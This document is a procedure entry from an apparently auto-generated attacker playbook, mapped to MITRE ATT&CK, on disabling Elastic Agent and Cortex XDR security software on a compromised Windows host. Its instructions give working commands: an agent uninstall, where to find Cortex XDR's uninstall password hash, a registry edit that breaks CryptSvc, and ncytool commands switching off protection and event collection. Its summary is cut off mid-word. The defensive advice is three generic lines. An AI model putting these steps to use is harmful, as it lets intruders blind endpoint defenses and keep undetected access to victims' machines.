---
id: 386cb069-7202-4af4-97ee-c0cf657fd64e
name: Windows - Disable Antivirus and Security (Elastic Agent and Cortex XDR)
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:27.644673+00:00'
updated_at: '2023-04-10T20:37:24.275181+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Discovery|TA0007 - Discovery]]'
techniques:
- '[[Forge Web Credentials|T1606 - Forge Web Credentials]]'
- '[[Impair Defenses|T1562 - Impair Defenses]]'
- '[[System Information Discovery|T1082 - System Information Discovery]]'
tags:
- '[[Antivirus Removal]]'
- '[[Disable Antivirus and Security]]'
- '[[Windows - Persistence]]'
commands:
- '[[Disable Agent on Startup]]'
- '[[Disable Cortex]]'
- '[[Disable Cortex XDR]]'
- '[[Disable Event Collection]]'
- '[[Disable Protection on Cortex XDR]]'
- '[[Global Uninstall Password]]'
- '[[Uninstall Elastic Agent]]'
---

# Windows - Disable Antivirus and Security (Elastic Agent and Cortex XDR)

## Summary

This procedure involves disabling antivirus and security software on a Windows system by uninstalling Elastic Agent and Cortex XDR. This can be used by an attacker to evade detection and maintain persistence on the compromised system. To accomplish this, the attacker would need to have access to th

## Description

# Description

This procedure involves disabling antivirus and security software on a Windows system by uninstalling Elastic Agent and Cortex XDR. This can be used by an attacker to evade detection and maintain persistence on the compromised system. To accomplish this, the attacker would need to have access to the system and the necessary privileges to uninstall software. The business value of this procedure is that it allows the attacker to maintain access to the compromised system and potentially move laterally within the network undetected.

 

## Requirements

1. Access to the compromised system

1. Privileges to uninstall software

 

## Defense

1. Implement and maintain strong endpoint protection, including antivirus and security software

1. Regularly monitor and audit system logs for suspicious activity

1. Implement network segmentation to limit lateral movement within the network

 

## Objectives

1. Disable Elastic Agent and Cortex XDR on the compromised system

1. Maintain persistence on the compromised system

1. Potentially move laterally within the network undetected

 

# Instructions

1. To uninstall Elastic Agent, navigate to the installation directory using the 'cd' command, then run the 'elastic-agent.exe uninstall' command. Confirm the uninstallation by entering 'Y' when prompted.

 



**Code**: [[cd "C:\Program Files\Elastic\Agent\"
PS C:\Program]]



> This command uninstalls Elastic Agent from the system. The 'cd' command is used to change the current directory to the installation directory of Elastic Agent. The 'elastic-agent.exe uninstall' command uninstalls the Elastic Agent. The prompt asks the user to confirm the uninstallation by entering 'Y'.



**Command** ([[Uninstall Elastic Agent]]):

```bash
cd "C:\Program Files\Elastic\Agent\"
PS C:\Program Files\Elastic\Agent> .\elastic-agent.exe uninstall
Elastic Agent will be uninstalled from your system at C:\Program Files\Elastic\Agent. Do you want to continue? [Y/n]:Y
Elastic Agent has been uninstalled.
```



2. To uninstall Cortex XDR, run the following commands in PowerShell:

 



**Code**: [[# Global uninstall password: Password1
Password ha]]



> This command will disable and uninstall the Cortex XDR agent from the system. It starts by providing the global uninstall password and the location of the password hash. Then it disables Cortex XDR, disables the agent on startup, disables protection on Cortex XDR files, processes, registry and services, disables Cortex XDR even with tamper protection enabled, and disables event collection. Please note that this command requires a reboot to work.



**Command** ([[Global Uninstall Password]]):

```bash
Password hash is located in C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db. Look for PasswordHash, PasswordSalt or password, salt strings.
```





**Command** ([[Disable Cortex]]):

```bash
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f
```





**Command** ([[Disable Agent on Startup]]):

```bash
ncytool.exe startup disable
```





**Command** ([[Disable Protection on Cortex XDR]]):

```bash
ncytool.exe protect disable
```





**Command** ([[Disable Cortex XDR]]):

```bash
ncytool.exe runtime disable
```





**Command** ([[Disable Event Collection]]):

```bash
ncytool.exe event_collection disable
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Discovery|TA0007 - Discovery]]

### Techniques

- [[Forge Web Credentials|T1606 - Forge Web Credentials]]
- [[Impair Defenses|T1562 - Impair Defenses]]
- [[System Information Discovery|T1082 - System Information Discovery]]

## Commands Used

- [[Disable Agent on Startup]]
- [[Disable Cortex]]
- [[Disable Cortex XDR]]
- [[Disable Event Collection]]
- [[Disable Protection on Cortex XDR]]
- [[Global Uninstall Password]]
- [[Uninstall Elastic Agent]]

## Tags

- [[Antivirus Removal]]
- [[Disable Antivirus and Security]]
- [[Windows - Persistence]]


